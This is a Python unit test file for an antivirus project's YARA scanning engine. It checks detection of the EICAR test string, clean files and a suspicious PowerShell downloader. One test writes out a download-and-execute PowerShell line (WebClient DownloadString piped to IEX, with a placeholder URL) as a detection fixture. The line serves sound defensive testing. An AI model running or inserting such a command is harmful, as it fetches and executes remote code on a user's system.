"""Tests for the YARA rule engine. Skip cleanly if yara-python isn't installed."""

import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from antivirus.yara_scan import YaraEngine, have_yara       # noqa: E402
from antivirus.signatures import EICAR_STRING                # noqa: E402


@unittest.skipUnless(have_yara(), "yara-python not installed")
class TestYara(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.eng = YaraEngine()

    def setUp(self):
        if not self.eng.available:
            self.skipTest("no rules compiled")
        self.tmp = Path(tempfile.mkdtemp())

    def _w(self, name, data):
        p = self.tmp / name
        p.write_bytes(data if isinstance(data, bytes) else data.encode())
        return p

    def test_eicar_rule_matches_as_test(self):
        dets = self.eng.scan_file(self._w("e.com", EICAR_STRING))
        sigs = {d.signature: d.severity for d in dets}
        self.assertIn("YARA.EICAR_Test_File", sigs)
        self.assertEqual(sigs["YARA.EICAR_Test_File"], "test")

    def test_powershell_downloader_is_suspicious(self):
        p = self._w("a.ps1",
                    "$c=New-Object Net.WebClient; IEX $c.DownloadString('http://x')")
        dets = self.eng.scan_file(p)
        d = {x.signature: x for x in dets}
        self.assertIn("YARA.Suspicious_PowerShell_Downloader", d)
        self.assertEqual(d["YARA.Suspicious_PowerShell_Downloader"].severity,
                         "suspicious")
        self.assertGreater(d["YARA.Suspicious_PowerShell_Downloader"].score, 0)

    def test_clean_file_no_match(self):
        dets = self.eng.scan_file(self._w("ok.txt", "nothing to see here\n" * 50))
        self.assertEqual(dets, [])

    def test_integration_via_scanner(self):
        from antivirus.scanner import Scanner
        self._w("e.com", EICAR_STRING)
        r = Scanner(use_trust=False).scan_path(self.tmp)
        # EICAR shows up via both the byte signature and the YARA rule.
        methods = {d.method for d in r.detections}
        self.assertIn("yara", methods)


if __name__ == "__main__":
    unittest.main(verbosity=2)
